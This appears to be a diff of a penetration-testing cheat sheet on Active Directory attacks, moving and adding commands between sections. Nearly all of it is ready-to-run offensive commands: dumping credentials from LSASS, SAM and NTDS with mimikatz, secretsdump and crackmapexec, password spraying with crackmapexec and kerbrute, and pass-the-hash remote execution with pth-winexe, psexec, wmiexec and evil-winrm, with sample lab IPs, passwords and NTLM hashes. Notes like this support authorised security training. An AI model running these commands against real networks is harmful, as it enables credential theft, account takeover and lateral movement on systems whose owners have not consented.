@@ -45,13 +45,24 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
          /usr/share/windows-binaries/fgdump/fgdump.exe
 
 ## Dump the credentials of all connected users, including cached hashes
-### Kali
+### Kali Crackmapexec
          sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345
          sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444
+         sudo crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --sam
+         sudo crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --lsa
+         sudo crackmapexec smb 192.168.1.50 -u jenkinsadmin -H ffffffffffffffffffffffff --ntds
          stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log
          stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log
-### Local
-         ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+### Kali Impacket
+         secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
+         secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
+         secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+         impacket-secretdump exam.com/apachesvc@192.168.1xx.101
+         
+### Local (privilege::debug, sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here)
+
+         ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
+         PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
 ## Cracking Ad Hashes
@@ -61,35 +72,83 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 
 ## Password Spraying
 
- -   Create Password List  
+- Spray with Crackmapexec using known password on list of found usernames
+```bash
+# Crackmapexec uses SMB - check if the output shows 'Pwned!'
+# protocols = smb, winrm, 
+# --continue-on-success to avoid stopping at the first valid credentials.
+crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
+crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
+        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
+        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
+        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
+        users.txt from Get-NetUser
+```
+
+- Spray with Kerbrute
+```bash
+kerbrute passwordspray -d corp.com .\usernames.txt "pass"
+```
+
+- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
+  ```bash
+  .\Spray-Passwords.ps1
+  .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+  ```
+  
+-   Create Password List  
      `crunchy <length> <length> -t <pw-core>%%%% `
    
 -    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
 
-## PASS THE Password
+## PASS THE Password and see what other accounts can the password access
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
+         crackmapexec <ip>/24 -u fcastle -d MARVEL.local -p <password>    
+
+- Remote Access - impacket-psexec  
+```
+psexec.py marvel/fcastle:Password1@192.168.57.142 
+```
         
-
-## Pass the Hash
-
+## Pass the Hash (Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached)
 - Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
 crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
+```
+
+- Exploitation to run commands as another user using PTH:
+``
+crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
+crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
+```
+
+- find which account can the hash access 
+```
+crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
 ```
 
 - Remote Access - impacket-psexec  
 ```
 impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
-impacket-psexec '<domain>/<user>'@<IP>
+psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
 ```
 
 - Remote Access + evil-winrm  
 ```
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
+
+#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
+crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
+
+#using wmiexec on kali
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
 
 ## Over Pass the Hash
 
@@ -210,6 +269,8 @@ runas /user:<hostname>\<user> cmd.exe
 
 
 
+
+
      
 
 # Tools Introduction
@@ -309,93 +370,7 @@ sudo bloodhound
 # then upload the .zip files obtained
 ```
 
-## **Attacking Active Directory Authentication**
 
-<aside>
-💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
-</aside>
-
-### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
-```bash
-secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
-secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
-```
-
-### Password Spraying
-
-- Dump passwords from memory using mimikatz
-```powershell
-PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
-```
-
--Dump passwords using impacket (try all user accounts that are found using net user /domain)
-```bash
-impacket-secretdump exam.com/apachesvc@192.168.1xx.101
-```
-
-- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
-  ```bash
-  #using LDAP and ADSI to perform a low and slow password attack against AD users
-  .\Spray-Passwords.ps1
-    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
-  ```
-  
-- Spray with known password on list of found usernames
-```bash
-# Crackmapexec uses SMB - check if the output shows 'Pwned!'
-# protocols = smb, winrm, 
-# --continue-on-success to avoid stopping at the first valid credentials.
-crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
-crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
-crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
-crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
-        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
-        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
-        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
-        users.txt from Get-NetUser
-
-# Kerbrute
-kerbrute passwordspray -d corp.com .\usernames.txt "pass"
-```
-
-### Pass the hash (lateral movement) for NTLM only
-- Access local SAM database (C:\Windows\System32\config\SAM) and dump all local hashes
-
-#### Using Crackmapexec
-- Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached
- 
-- Dump SAM hashes: `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --sam`
-- Dump LSA dump (domain credentials): `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --lsa`
-- Exploitation: `crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'`
-- Exploitation to dump all hashes (if is domain admin access): `crackmapexec smb 192.168.1.50 -u jenkinsadmin -H ffffffffffffffffffffffff --ntds`
-- Exploitation to run commands as another user using PTH: `crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'`
-
-#### Using pth-winexe 
-- pass the hash get a shell immediately: `sudo pth-winexe -U web/administrator%<hash:hash> //192.168.1.54 cmd.exe`
-
-```powershell
-PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
-```
-
-- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
-```powershell
-#dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
-#dump credentials stored in LSASS and cache hashes
-privilege::debug
-sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
-```
-
-- Pass the hash
-
-```bash
-#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
-crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
-        crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
-
-#using wmiexec on kali
-kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
-```
 
 ### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
 ```bash
